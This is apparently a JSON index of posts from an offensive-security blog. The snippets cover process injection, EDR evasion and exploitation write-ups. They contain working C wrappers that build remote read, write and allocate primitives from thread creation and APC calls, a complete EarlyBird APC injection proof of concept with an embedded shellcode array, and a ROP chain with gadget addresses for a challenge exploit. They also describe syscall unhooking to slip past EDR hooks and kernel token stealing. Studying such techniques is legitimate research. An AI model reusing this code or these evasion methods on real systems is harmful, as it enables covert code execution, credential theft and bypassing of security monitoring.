[ { "title": "Primitive Injection - Breaking the Status Quo", "url": "/posts/Primitive-Injection/", "categories": "", "tags": "", "date": "2025-06-06 00:00:00 +0800", "snippet": "It has been a while, this is my research on trying to change the IOCs of a common remote process injection flow and the end result.I presented this in RedTreat in 2024 and I thought it was about time I publish it.As you most likely know, in order to perform remote process injection a few things need to happen:1) Open the remote process with PROCESS_ALL_ACCESS or PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD to obtain handle to the process2) Remote allocate enough memory to fit your shellcode3) Make that memory executable4) Create a new thread that will execute that shellcode memory addressObviously there are multiple other variations but they all are quite similar. I thought I would give a challenge to myself and achieve the above or, like I mentioned, other variations by only openingthe remote process with PROCESS_CREATE_THREAD and PROCESS_QUERY_LIMITED_INFORMATION. If you have not understood yet where this is going, basically I wanted to create primitives or remotely allocating,reading and writing memory remotely by just creating threads.There has been some previous research on this by Austin Hudson (He posted something on twitter X) and x86matthew but I wanted something better.I am sure most of you would think, let’s try to find a rop gadget and do this; so did I! However, it was not that easy since in order to avoid PROCESS_VM_OPERATION to patch CFG on processes was included in my challenge.This means that I would have to find a rop gadget that would not be impacted by CFG and that it will be good for the job. Also I wanted to limit my rop gadgets to ntdll for personal reasons.Remote allocation is easy enough if you do not care about its permissions in memory as long as it is writable; just open the remote process with PROCESS_QUERY_LIMITED_INFORMATION and PROCESS_CREATE_THREAD, and create a new thread by passing the malloc function with the size you want the allocation to have.Malloc Definition:void *malloc( size_t size);New Thread:NtCreateThreadEx(&amp;amp;hThread, THREAD_ALL_ACCESS, NULL, hProc, malloc, (PVOID)sizeofShellcode, FALSE, NULL, NULL, NULL, NULL);NtCreateThreadEx or CreateRemoteThread can take a function to call as an argument and then pass it one argument to that function, which should suffice for this.If you are not aware, malloc function internally will automatically pick a place in memory according to the process’ heap base address. Until this point everything is moving in the right direction, but there is a problem that needs to be tackled. How do I find the address that the allocation happened?Thankfully there is an API called GetExitCodeThread that allows to receive the EAX register, which means the return value from the thread, which in this case provides the memory allocation. HOWEVER, it only returns EAX, 4 bytes, but this is a technique for x64 bit Windows that requires to have 6 bytes instead (since heap alloc is in user mode).GetExitCodeThread Definition:BOOL GetExitCodeThread( HANDLE hThread, LPDWORD lpExitCode);This was a blocking point on finding the remote memory address, so I tried to tackle the Read primitive in case it could help me approach this difficulty and somehow finding the address.Like I mentioned earlier, avoiding CFG was tough, so it took me a lot of time to go through potential avenues for finding rop gadgets to achieve a read process memory operation but after a while I found something better than a rop gadget; I found an existing function called RtlQueryDepthSList.RtlQueryDepthSList Definition (This is my definition, not MSDN’s):DWORD RtlQueryDepthSList( PVOID addressToRead);RtlQueryDepthSList Assembly:mov eax, word ptr [rcx]ret;RtlQueryDepthSList takes one argument of the memory you want to read, but only read 2 bytes and then returns 4 back. Since RtlQueryDepthSList can get us 2 bytes at a time, it is not the most optimal situation, ideally we would need something that would read a DWORD to create less threads and read remote memory. By looping and iterating 2 bytes at the memory we want to read though we can successfully achieve what we need.Wrapper created for read primitive:unsigned char* ReadRemoteMemory(HANDLE hProc, LPVOID addrOf, int sizeofVal) { unsigned char* readBytes = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 8); DWORD dwDataLength = sizeofVal; for (DWORD i = 0; i &amp;lt; dwDataLength; i = i + 2) { HANDLE hThread = NULL; NtCreateThreadEx(&amp;amp;hThread, GENERIC_EXECUTE, NULL, hProc, RtlQueryDepthSList, (ULONG_PTR*)((BYTE*)addrOf + i), FALSE, NULL, NULL, NULL, NULL); DWORD ExitCode = 0; NtWaitForSingleObject(hThread, FALSE, NULL); GetExitCodeThread(hThread, &amp;amp;ExitCode); if (dwDataLength - i == 1) { CustomCopy((char*)readBytes + i, (const void*)&amp;amp;ExitCode, 1); } else { CustomCopy((char*)readBytes + i, (const void*)&amp;amp;ExitCode, 2); } } return readBytes;}The wrapper performs now pretty similarly to ReadProcessMemory, it takes the handle of the process, the memory we want to read, how many bytes we want to read and then it returns back the allocated memory. Next step was stitching the Read primitive with the Allocation primitive to obtain the remotely allocated memory address.Turns out there is a workaround and this is the reason PROCESS_QUERY_LIMITED_INFORMATION is required (or does it?).By calling NtQueryInformationProcess and asking for ProcessBasicInformation, it is possible to receive the remote process’ PEB address, which also contains the process base heap address.Since malloc allocates in process’ base heap, my allocation should be based on that base heap, hence since I could obtain the last 4 bytes of the allocation address, I could perform an AND mask operation between them.Steps for obtaining the remotely allocated address:1) Call NtQueryInformationProcess with ProcessBasicInformation to obtain the PEB address2) Calling the Read primitive on the previously obtained PEB address + 0x30 offset, and reading 8 bytes to get the heap base address off the GetExitCodeThread3) Perform the AND mask operation to calculate the actual allocation address:DWORD64 heapAllocation = (0xFFFFFFFF00000000 &amp;amp; (INT64)HeapAddr) + ExitCode;Wrapper created for this primitive for remote allocation:LPVOID RemoteAllocation(HANDLE hProc, LPVOID HeapAddr, int sizeofVal) { HANDLE hThread = NULL; NtCreateThreadEx(&amp;amp;hThread, THREAD_ALL_ACCESS, NULL, hProc, malloc, (PVOID)sizeofVal, FALSE, NULL, NULL, NULL, NULL); NtWaitForSingleObject(hThread, FALSE, NULL); DWORD ExitCode = 0; GetExitCodeThread(hThread, &amp;amp;ExitCode); DWORD64 heapAllocation = (0xFFFFFFFF00000000 &amp;amp; (INT64)HeapAddr) + ExitCode; return (LPVOID)heapAllocation;}Right now, it is possible to read and allocate remotely; what is left is writing, which unfortunately by the approach so far and using NtCreateThreadEx will not work since it can only allow us to pass one argument to whatever it is we are calling. However in a WriteProcessMemory situation, it would require to pass a memory to write the bytes and the bytes to write, so at least 2 arguments. NtQueueApcThread allows for up to 3 arguments, so I had to find a rop gadget to achieve that in the most optimal way.Both of the public approaches used RtlFillMemory which fits with NtQueueApcThread but it would literally create 1 APC request per byte that you want to write, hence an average shellcode of 270kb would create 270.000 APCs. Crazy amount, which I actually tried against MDE and got an alert for StackBombing.After looking for so many hours into ntdll assembly instructions for something that would fit the purpose of Write primitive, I finally found, guess what, ANOTHER FUNCTION, RtlInitializeBitMapEx.RtlInitializeBitMapEx Definition (Again, this is my definition, not MSDN’s):BOOL RtlInitializeBitMapEx( PVOID addressMemoryToWrite, PVOID 8bytesToWriteAfter8Bytes, PVOID 8bytesToWrite);RtlInitializeBitMapEx Assembly:mov [rcx], r8mov [rcx+8], rdxret;Realistically speaking this is a godsend function/rop gadget (fop gadget?), since it allows not only to write 8 bytes at a time but 16! This is 16 times better than RtlFillMemory, since this function takes as a first argument the memory where we want to allocate the bytes to; as a second argument, it takes the 8 bytes after the first 8 bytes we want to write into the allocated address plus 8 bytes; as a third argument it takes the first 8 bytes we want to write into the allocated address, so performing a NtQueueApcThread loop and iterating by 16 bytes at a time allows for writing in the remote process successfully. However, in order to optimize the process in case the bytes are more or less than 8 or 16 or divisible by 8, I had to use RtlFillBuffer as well.Wrapper created for this primitive for remote allocation:void WriteRemoteMemory(HANDLE hProc, LPVOID heapAllocation, int sizeofVal, unsigned char* buffer, HMODULE module) { LPVOID RtlFillMemory = GetProcAddress(module, &quot;RtlFillMemory&quot;); LPVOID RtlExitUserThread = GetProcAddress(module, &quot;RtlExitUserThread&quot;); LPVOID RtlInitializeBitMapEx = GetProcAddress(module, &quot;RtlInitializeBitMapEx&quot;); HANDLE hThread2 = NULL; NtCreateThreadEx(&amp;amp;hThread2, THREAD_ALL_ACCESS, NULL, hProc, RtlExitUserThread, (PVOID)0x00000000, TRUE, NULL, NULL, NULL, NULL); int alignmentCheck = sizeofVal % 16; int offsetMax = sizeofVal - alignmentCheck; int firCounter = 0; int eightCounter = 0; int secCounter = 0; int mod = 0; if (sizeofVal &amp;gt;= 16) { for (firCounter = 0; firCounter &amp;lt; offsetMax -1; firCounter = firCounter + 16) { char* heapWriter = (char*)heapAllocation + firCounter; NtQueueApcThread(hThread2, (PKNORMAL_ROUTINE)RtlInitializeBitMapEx, (PVOID)heapWriter, (PVOID)*(ULONG_PTR*)((char*)buffer + firCounter + 8), (PVOID)*(ULONG_PTR*)((char*)buffer + firCounter)); } } if (alignmentCheck &amp;gt;= 8) { for (eightCounter = firCounter; (eightCounter + 8) &amp;lt; (firCounter + alignmentCheck -1); eightCounter = eightCounter + 8) { char* heapWriter = (char*)heapAllocation + eightCounter; NtQueueApcThread(hThread2, (PKNORMAL_ROUTINE)RtlInitializeBitMapEx, (PVOID)heapWriter, NULL, (PVOID)*(ULONG_PTR*)((char*)buffer + eightCounter)); } alignmentCheck -= 8; } if (alignmentCheck != 0 &amp;amp;&amp;amp; alignmentCheck &amp;lt; 8) { if ((firCounter != 0 &amp;amp;&amp;amp; eightCounter != 0) || (firCounter != 0 &amp;amp;&amp;amp; eightCounter != 0)){ secCounter = eightCounter; mod = eightCounter; } else if (firCounter != 0 &amp;amp;&amp;amp; eightCounter == 0){ secCounter = firCounter; mod = firCounter; } for (; secCounter &amp;lt; (mod + alignmentCheck); secCounter++) { char* heapWriter = (char*)heapAllocation + secCounter; NtQueueApcThread(hThread2, (PKNORMAL_ROUTINE)RtlFillMemory, (PVOID)heapWriter, (PVOID)1, (PVOID)buffer[secCounter]); } } NtResumeThread(hThread2, NULL); NtWaitForSingleObject(hThread2, FALSE, NULL);}As a fun fact I might as well mention that the 270.000 APCs turned to 16.875 APCs which is an insane progress and no stackbombing alert anymore.The Write primitive wrapper takes as a first argument the handle of the remote process; as a second argument the remotely allocated memory; as a third argument how many bytes we want to write; as a fourth argument the buffer that contains the bytes we want to write in the remote process; as a fifth argument the ntdll’s base address.AchievementsRight now it is possible to read, write and allocate in a remote process with just PROCESS_CREATE_THREAD, PROCESS_QUERY_LIMITED_INFORMATION without requiring to patch CFG. It is really easy to perform an injection which I am not gonna go through here but in the proof of concept code on my github link, you will find a BOF example. I will be cheating there a little bit by using PROCESS_VM_OPERATION to patch CFG in the remote process in order to call NtContinue, since Foliage’s method of calling APIs in the remote process is very convenient and also write primitive solves the problem with passing more than four arguments with the CONTEXTS, like you will notice in my POC. FYI I leave this for the reader; it is possible to perform a very OPSEC injection with limited IOCs with just PROCESS_CREATE_THREAD permissions.Aside from the above, it is worth mentioning that we completely remove the telemetry of ETWTI for ReadProcessMemory and WriteProcessMemory. Also we create threads and call APCs with addresses that are fully backed in memory to files on disk.CaveatsThe only caveat I want to mention is that the read primitive, even though it works great for reading small size buffers, trying to abuse this to read many chunks will make the system unusable and almost frozen, since I tried to perform LSASS dumping with it and the amount of threads being created is just insane. It was working but after a bit it just froze, so realistically you cannot use it for LSASS dumping BUT you might be able to find a faster method to do it (wink wink).BonusI hope you took note of the fact that I do not call ROP gadgets, they are literally functions, which has some positive side effects. Aside from the fact that these primitives are also useful in exploit developers, they also offer a partial CET bypass. Even though I am not an expert on the subject of CET, It offers a couple of protection mechanisms; Shadow stack and Indirect Branch Tracking (IBT).IBT is a code integrity control flow mechanism that can easily kill rop gadgets but since in my case the primitives call literal function, it is an automatic bypass.Another bonus which is an extreme case but could happen is, if you would ever find an elevated process that allows for a low/medium context process to open a handle with just PROCESS_CREATE_THREAD, you can perform a privilege escalation.Final NotesObviously these wrappers can be used for the local process as well but it kind of loses the point, since it is easier to write a custom memcpy to read/write bytes. Lastly, this is more about the primitives and the wrappers than the actual injection that is the result of them." }, { "title": "Custom ReadMemory API", "url": "/posts/Custom-ReadMemory-API/", "categories": "", "tags": "", "date": "2022-02-13 00:00:00 +0800", "snippet": "After the great job and inspiration by x86matthew and his blogpost I decided to play with it as well for x64 bit.The NTAPI function in this method is RtlFirstEntrySList from ntdll.dll. Its definition like Matthew mentioned in his blog is similar like this:DWORD RtlFirstEntrySList(DWORD* Address)In his blog, only the x86 version is referenced and used, so I was curious and took a look myself.Unfortunately, in x64 bit the actual function looks like this:We can see that there are 2 minor issues in the x64 bit version of this function, first one is that the argument of RtlFirstEntrySList will be +8, mov rax, qword ptr(rcx+8) which is easy to solve by just adding -8 in the passed address argument.FYI, for my POC, I am just reading the address of RtlFirstEntrySList but using reference of its address.You can alter it be removing the reference(&amp;amp;) to just read the contents of that address.First issue bypassed! Second one is not possible to evade that easy since it will perform and al, 0F0h in the byte we want to fetch, hence losing the accuracy of the byte and obtaing a completely wrong address.The only way around this would be to patch the 2 bytes that perform the logical AND instruction like I do so, in the POC with WriteProcessMemory.After patching the 2 bytes our function will look like this and it will be executed via NTDLL as normal.Obviously the result will come back as little endian, but you can always allocate the bytes in a buffer and print or use them in a proper manner.POC: https://github.com/trickster0/CReadMemoryMake sure you read the blog posts and research of Matthew, there are some great stuff on his blog." }, { "title": "Halo&#39;s Gate Evolves -&gt; Tartarus&#39; Gate", "url": "/posts/Halo's-Gate-Evolves-to-Tartarus-Gate/", "categories": "", "tags": "", "date": "2021-11-27 00:00:00 +0800", "snippet": "A while ago in my twitter, I have mentioned what a huge fan I am of Hell’s Gate and Halo’s Gate.Hell’s Gate originally is a very creative way to fetch the syscall numbers by parsing the InMemoryOrderModuleLIst from PEB structure.By finding the ntdll.dll address, which is usually the first entry in InMemoryOrderModuleLIst, it is possible to obtain the syscall numbers by parsing its exports for the necessary functions we need.Even though this is an excellent technique to bypass most of the Antiviruses, unfortunately due to the evolution of EDRs and unhooking, this technique cannot succeed.Below we can see a normal syscall where Hell’s Gate would absolutely work.As we have mentioned EDRs evolved and a new technique came to light by Reenz0h,called Halo’s Gate.Halo’s Gate is basically a modified version of Hell’s Gate to unhook the WINAPI calls.For anyone not aware, unhooking is the process where you evade the hooked WINAPI functions by the AVs/EDRs in order for them to check the parameters and the flow of a program.Halo’s Gate basically check the first bytes of the called WINAPI and if they are as they should “4c8bd1b8”, then the WINAPI is not hooked and everything proceeds normally, but when the first byte is “e9”, then a jmp assembly instructions redirects the execution of the program to the AV/EDR checking engine, hence it is hooked.In the screenshot you can see what a hooked call looks like by certain EDRs.Halo’s Gate tackles this problem if the byte is “e9” by going up or down and check the syscall of the next or previous syscall, if it is not hooked then we grab the syscall and add +1 byte since they are all in order.Since I am very fond of this technique and It was not working in different EDRs, I was curious why and I had to dig more since it was not the detection/prevention of the security product but it was just failing.Soon I realized that not all EDRs hook the same way, so I had to bypass and extend it Halo’s Gate further into Tartarus’ Gate.Regarding the EDR, that I was against, I am sure it is easy to find out which one it is but apparently it starts with the bytes “4c8bd1e9” as you can see below when the WINAPI call is hooked.Basically what I did was to modify the Halo’s Gate code by adding one more check, to check for the 4th byte if it is “e9”, if it is, it will do the same as the explanation on Halo’s Gate to unhook it, so I ended up calling this Tartarus’ Gate.I am certain there are more EDRs that have their own hooking method so I can see how this could evolve even further depending on the situation.Source Code can be found hereYou will notice that the custom way to copy the shellcode to the allocated space is removed, for some reason it was not working very well against this EDR so I would avoid depending on the case.Also, this code might fail a few times depending on the EDR, so if it will not work on the first try, try a few times. If you use a different method that works better than CreateRemoteThread, it will work in a very stable manner.Resources:https://sektor7.net/#!res/2021/halosgate.mdhttps://github.com/am0nsec/HellsGateCredits to : Reenz0h from Sektor7 for Halo’s Gate and the authors of Hell’s Gate - Paul Laîné and smelly__vx" }, { "title": "Solving the BFS Ekoparty 2019 Exploitation Challenge", "url": "/posts/Solving-the-BFS-EkoParty/", "categories": "", "tags": "", "date": "2021-11-05 00:00:00 +0800", "snippet": "This is a quick write up about how one of our team members, Thanasis, solved the challenge for EkoParty 2019. This was a fun challenge and thanks to Lukas and Nico from Blue Frost Security for making it happen(and for supporting our community).More information about the challenge can be found at:https://labs.bluefrostsecurity.de/blog/2019/09/07/bfs-ekoparty-2019-exploitation-challenge/The application as the requirements provided, need to run in windows 10 x64 (RS6) version and the goal is to bypass ASLR and execute a calc.exe process.By opening the application we can see via netstat that it binds on port 54321 on 0.0.0.0 (all the machine’s interfaces).By opening Ghidra and going to the main function it is obvious that some checks need to bypassed in order to correctly send a payload to the application.In Ghidra, if we check the function that is called after the new connection is accepted, we see this:Upon first check, it checks for the first 0x10 bytes(16 chars) as a header.The second and third checks: If the header starts with 0x393130326f6b45(Ekoparty2019) then we are allowed to send a user_message as long as it is smaller than 0x201 bytes(513 chars).The last fourth check is quite important, we can send all this packet structure but it needs to be aligned correctly for 8 bytes. Meaning we could send 16,24,32 and so on.After we succeed in sending a big buffer, it appears that the application crashes after 529 bytes or so.By sending 528 bytes structured correctly with the cookie included in the beginning, we notice that before the calling function sub_140001170, we actually control the RAX, which is the 513 bytes.Before this, there is this instructionlea rcx, unk_7FF6A8A9E520unk_7FF6A8A9E520, holds an array with this structureBy sending the 513 characters, for example as A or \\x41 we can make it so the function will return our byte + the rest of the pattern. In this case c3c3c3c3 + ourbyte+488b01.The function sub_140001170 before it returns this value turns it to little endian, making it ourbyte+488b01c3c3c3c3. So we get 41488b01c3c3c3c3.This value will be used in WriteProcessMemory as lpBuffer, basically copying these bytes to the function sub_7FF6A8A91000 as instructions allowing to control what we can execute when we reach it.Although this is quite good, it provides a limitation of instructions, meaning we can only use instructions byte+488b01c3c3c3c3.I made a quick script in python producing all the values in a filebyte=0x00endbyte=0xff start =&quot;848b01c3c3c3&quot; for i in xrange(byte,endbyte+1): print format(i,&#39;X&#39;)+ startWith a one-liner bash I got all the values:for i in $(cat list_instructions);do echo -e &quot;\\n$i&quot; &amp;amp;&amp;amp; rasm2 -b 64 -D $i ; done &amp;gt; instructionsOne good thing in this case is that we can actually control the RCX from our input buffer with the characters provided from 513 till 528.The first thing I had to do was, get the process address from PEB.By sending in our payload these are the last bytes:“\\x65\\x65\\x65\\x65\\x65\\x65\\x65\\x65\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00”We could achieve and acquire the PEB. \\x65 is meant for the combination from the previous instructions.65488b01c30: 65 48 8b 01 mov rax,QWORD PTR gs:[rcx] 4: c3 retIt is well known that in x64 bit windows, GS register is a special register which points to PEB by providing the accurate offset. In this case since we could control RCX, we pointer GS directly to the PEB which is at offset 0x60 hence the highlighting.Since the application will always sends us back the data leaked we can get this address and use it.The next step would be to get the Image Base Address of the application.Image Base Address is located from the PEB + 0x10 offset. In this case we had to set the address + 0x10 as a pointer to RCX to be able to leak the address.In this case, according to our possible instructions we chose:0: 47 8b 01 mov rax,QWORD PTR [rcx] 3: c3 retThe first byte 47 and these as before are the last bytes of our payload:“\\x47\\x65\\x65\\x65\\x65\\x65\\x65\\x65 + address+0x10”As an end goal we need to create a ROP chain to execute calc.exe.Since we would like to bypass ASLR, leakage is already useful but in case we would need to execute something, we would have to bypass DEP as well.In this case it is good that we have, in the beginning of the application, a winexec call.Therefore, in the end we will call calc.exe through winexec but, winexec requires that the application will be executed to be pointed at, hence a pointer that points to the string calc.exe and a null terminator.Somehow I had to be able to find that place in memory with my string. The best way was to get the StackBase Limit and get towards the stack base to find where it is.First, I had to leak StackBase Limit.StackBaseLimit is in the TEB at 0x10 offset through the GS register.The initial request I used :0: 65 48 8b 01 mov rax,QWORD PTR gs:[rcx] 4: c3 retI controlled the RCX by setting it to 0x10.After actually getting the leaked address of the Stack Base Limit, it is time for a loop towards the Stack Base to find the correct string which would be calc.exe.By doing a loop, I started leaking the memory cells of the stack up to a point where it detected my string.The moment the string was found, I saved into a counter and multiplied by 0x08 to get how many cells down the stack I had to go.So now I had the address of the string.In the above scenario I used:0: 47 8b 01 mov rax,QWORD PTR [rcx] 3: c3 retWith RCX as the Stack Base Limit and constantly adding 0x08 to it.The next step would be to get the winexec’s address on the stack. By checking the .rdata of the application I could see the offset of it.In this case, I need to leak the address from Image Base Address + 0x9010 offset.By using exactly the same instructions as before:0: 47 8b 01 mov rax,QWORD PTR [rcx] 3: c3 retThen adding RCX as the Image Base Address+0x9010 , I get the leaked address for Winexec on the stack.For the final request to the application I used0: 51 push rcx1: 48 8b 01 mov rax,QWORD PTR [rcx] 4: c3 retI set the RCX to a pivot gadget “add rsp,78h ; ret”, so I can stack pivot.I used Ropper and rp++ to get gadgets out of the application.Thankfully, the ret instruction gets us to a point in our buffer.According to MSDN Wincalc requires 2 arguments, the name of the application and a number which will set the mode of the window.In windows 10 x64 , the calling convention is rcx,rdx,r8,r9 and top of the stack.The structure of the packet is this. The whole packet is the cookie + 528 characters.Structure: 16 junk bytes padding pop_rax_gadget Pop Image Base Address for having a valid address on RAX because the only pop rdx and pop rdx gadgets set bad values to it. Image Base Address – 0x08 valid address pop_rdx_gadget pop rdx gadget to put 0x01 for the Wincalc second argument. 0x01 Winexec UINT uCmdShow pop_rax_gadget again for the same reason that the pop rcx gadget will set bad value to rax pop_rcx_gadget set the pointer address that points to calc.exe\\x00 address_pointing_calc address that points to calc.exe\\x00 72 junk bytes padding ret_gadget just a return gadget to fix the stack alignment to 16-byte format, because CreateProcessA is called inside the Winexec function which includes movabs instruction. Movabs instructions check if the stack is aligned and if not it will raise an exception. winexec_leaked_address winexec address on the stack. add_rsp_0x78 adds to current RSP + 0x78 bytes to reach the next stack pivot. 120 junk bytes padding. add_rsp_0x78 adds to current RSP + 0x78 bytes to reach the next stack pivot. 120 junk bytes padding. add_rsp_0x28 adds to current RSP + 0x28 bytes to reach the next stack pivot. 40 junk bytes padding. add_rsp_0x58 adds to current RSP + 0x58 bytes to reach the original return pointer address and continue the execution of the application instead of crashing it. 8 junk bytes padding. calc.exe\\x00 string to set in memory. 15 junk bytes padding. Gadgets Used: Gadget Address Gadget 0x14000158b add rsp, 0x78 ; ret ; x0000000140004525 pop rdx; add byte ptr [rax], al; cmp word ptr [rax], cx; je 0x4530; xor eax, eax; ret; 0x140001167 pop rax ; ret ; 0x00000001400089ab pop rcx; or byte ptr [rax], al; add byte ptr [rax - 0x77], cl; add eax, 0x4b12; add rsp, 0x48; ret; 0x0000000140001164 add rsp, 0x58; ret; 0x14000158f ret ; 0x00000001400011d5 add rsp, 0x28; ret; Full Working exploit: https://github.com/trickster0/BFS-Ekoparty-2019-challengeProof of Concept:Results:" }, { "title": "EarlyBird APC Queue Injection With a ProcessStateChange Twist", "url": "/posts/earlybird-apc-queue-injection-with-processstatechange-a-twist/", "categories": "", "tags": "", "date": "2021-08-01 00:00:00 +0800", "snippet": "Relatively recently, Yarden Shafir made a blog post about a new way to evade the EDRs for process injection. In the blog post, Yarden mentions that there are new added features in the recent Windows 10 build(Insider) and Windows 11 as well. Some of them are NtCreateProcessStateChange/ NtCreateThreadStateChange and NtChangeProcessState/NtChangeThreadState.These WINAPI calls were added to resolve the issue of what happens if a process suspends a thread and then terminates it before resuming it. To quote Yarden:Unless some other part of the system realizes what happened, the thread will remain suspended forever and will never resume its execution. To solve that, this new feature allows suspending and resuming threads and processes through the new object types, which will keep track of the suspension state of the threads or processes. That way, when the object is destroyed (for example, when the process that created it is terminated), the system will reset the state of the target process or thread by suspending or resuming it as needed.Yarden has made a PoC at the bottom of the blog potentially continuing a suspended thread, due to these aforementioned new WINAPI calls, a suspended application can now resume or reset. By using DuplicateHandle and getting the second notepad a handle to the first suspended notepad, the suspended notepad remains as is until the second notepad closes and resumes the first notepad without using ResumeThread.Evading common process injection patterns for WINAPI calls can definitely trick some EDRs. Although I took a different approach in my PoC and followed the pattern of EarlyBird APC Queue Injection and instead of creating a suspended process, allocate shellcode and ResumeThread, I created a process, suspended it with NtCreateProcessStateChange, allocated the shellcode and then changed the suspended state back with NtChangeProcessState to continue the primary thread.Obviously the below code will be detected due to the shellcode, VirtualAlloc, WriteProcessMemory, QueueUserAPC but SysWhispers can help you replace that will the ntdll’s WINAPI calls for better results.PoC: #include &amp;lt;Windows.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;winternl.h&amp;gt;typedef NTSTATUS(__fastcall* NtCreateProcessStateChange)(OUT PHANDLE StateChangeHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN HANDLE ProcessHandle, IN INT Unknown);typedef NTSTATUS(__fastcall* NtChangeProcessState)(IN HANDLE StateChangeHandle, IN HANDLE ProcessHandle, IN ULONG Action, IN ULONG64 Unknown1, IN ULONG64 Unknown2, IN ULONG64 Unknown3);void main(){ HANDLE stateChangeHandle; PROCESS_INFORMATION procInfo; PROCESS_INFORMATION procInfo2; STARTUPINFO startInfo; BOOL result; NTSTATUS status; NtCreateProcessStateChange pNtCreateProcessStateChange; NtChangeProcessState pNtChangeProcessState; HMODULE hNtdll; unsigned char buf[] = &quot;\\x48\\x31\\xc9\\x48\\x81\\xe9\\xdd\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\x4f\\x6c\\xaf\\x32\\x7e\\xe4\\xec\\x88\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xb3\\x24\\x2c\\xd6\\x8e\\x0c\\x2c\\x88\\x4f\\x6c\\xee\\x63\\x3f\\xb4\\xbe\\xd9\\x19\\x24\\x9e\\xe0\\x1b\\xac\\x67\\xda\\x2f\\x24\\x24\\x60\\x66\\xac\\x67\\xda\\x6f\\x24\\x24\\x40\\x2e\\xac\\xe3\\x3f\\x05\\x26\\xe2\\x03\\xb7\\xac\\xdd\\x48\\xe3\\x50\\xce\\x4e\\x7c\\xc8\\xcc\\xc9\\x8e\\xa5\\xa2\\x73\\x7f\\x25\\x0e\\x65\\x1d\\x2d\\xfe\\x7a\\xf5\\xb6\\xcc\\x03\\x0d\\x50\\xe7\\x33\\xae\\x6f\\x6c\\x00\\x4f\\x6c\\xaf\\x7a\\xfb\\x24\\x98\\xef\\x07\\x6d\\x7f\\x62\\xf5\\xac\\xf4\\xcc\\xc4\\x2c\\x8f\\x7b\\x7f\\x34\\x0f\\xde\\x07\\x93\\x66\\x73\\xf5\\xd0\\x64\\xc0\\x4e\\xba\\xe2\\x03\\xb7\\xac\\xdd\\x48\\xe3\\x2d\\x6e\\xfb\\x73\\xa5\\xed\\x49\\x77\\x8c\\xda\\xc3\\x32\\xe7\\xa0\\xac\\x47\\x29\\x96\\xe3\\x0b\\x3c\\xb4\\xcc\\xc4\\x2c\\x8b\\x7b\\x7f\\x34\\x8a\\xc9\\xc4\\x60\\xe7\\x76\\xf5\\xa4\\xf0\\xc1\\x4e\\xbc\\xee\\xb9\\x7a\\x6c\\xa4\\x89\\x9f\\x2d\\xf7\\x73\\x26\\xba\\xb5\\xd2\\x0e\\x34\\xee\\x6b\\x3f\\xbe\\xa4\\x0b\\xa3\\x4c\\xee\\x60\\x81\\x04\\xb4\\xc9\\x16\\x36\\xe7\\xb9\\x6c\\x0d\\xbb\\x77\\xb0\\x93\\xf2\\x7a\\xc4\\xe5\\xec\\x88\\x4f\\x6c\\xaf\\x32\\x7e\\xac\\x61\\x05\\x4e\\x6d\\xaf\\x32\\x3f\\x5e\\xdd\\x03\\x20\\xeb\\x50\\xe7\\xc5\\x14\\x59\\x2a\\x19\\x2d\\x15\\x94\\xeb\\x59\\x71\\x77\\x9a\\x24\\x2c\\xf6\\x56\\xd8\\xea\\xf4\\x45\\xec\\x54\\xd2\\x0b\\xe1\\x57\\xcf\\x5c\\x1e\\xc0\\x58\\x7e\\xbd\\xad\\x01\\x95\\x93\\x7a\\x51\\x1f\\x88\\x8f\\xa6\\x2a\\x14\\xca\\x32\\x7e\\xe4\\xec\\x88&quot;; SIZE_T shellSize = sizeof(buf); stateChangeHandle = nullptr; ZeroMemory(&amp;amp;startInfo, sizeof(startInfo)); startInfo.cb = sizeof(startInfo); result = CreateProcess(L&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;,NULL,NULL,NULL,FALSE,0,NULL,NULL,&amp;amp;startInfo,&amp;amp;procInfo); HANDLE victimProcess = procInfo.hProcess; HANDLE threadHandle = procInfo.hThread; hNtdll = GetModuleHandle(L&quot;ntdll.dll&quot;); pNtCreateProcessStateChange = (NtCreateProcessStateChange)GetProcAddress(hNtdll, &quot;NtCreateProcessStateChange&quot;); status = pNtCreateProcessStateChange(&amp;amp;stateChangeHandle, MAXIMUM_ALLOWED, NULL, procInfo.hProcess, 0); pNtChangeProcessState = (NtChangeProcessState)GetProcAddress(hNtdll, &quot;NtChangeProcessState&quot;); status = pNtChangeProcessState(stateChangeHandle, procInfo.hProcess, 0, NULL, 0, 0); LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress; WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL); QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL); status = pNtChangeProcessState(stateChangeHandle, procInfo.hProcess, 1, NULL, 0, 0);} Sources:EarlyBird APC Queue Injection - https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injectionNtCreateProcessChangeState Blog Post - https://windows-internals.com/thread-and-process-state-change/NtCreateProcessChangeState gist example - https://gist.github.com/DownWithUp/80a3b7b6a198788e79d8b508463e9384" }, { "title": "HEVD: Kernel Stack Buffer Overflow in Rust!", "url": "/posts/hevd-kernel-stack-buffer-overflow-in-rust/", "categories": "", "tags": "", "date": "2019-04-09 00:00:00 +0800", "snippet": "Hello,so this is a real quick explanation of the kernel buffer overflow showcasing rust programming language.Hacksys driver has a buffer overflow because it doesn’t check the size of the copied input into the stack.By using the appropriate IOCTL code, we can contact the Symbolic Link, hence the device and send our own input,trying to control the EIP register and then jumping back to user space into our shellcode that will check the PID of our process and the system’s, which is always 4 and then replace our token with the system’s.Below is the source code in rust and the output of getting System privileges.Obviously this is windows 7 and there is no need to reason to deal with SMEP since it was not implemented for windows 7.Main Code:Cargo.Toml:Shell:" }, { "title": "Linux Kernel Exploitation: Null Pointer Dereference", "url": "/posts/linux-kernel-exploitation-null-pointer-dereference/", "categories": "", "tags": "", "date": "2019-04-01 00:00:00 +0800", "snippet": "Hello everyone, this will be a solution for a root-me challenge. The challenge is null pointer dereference in linux 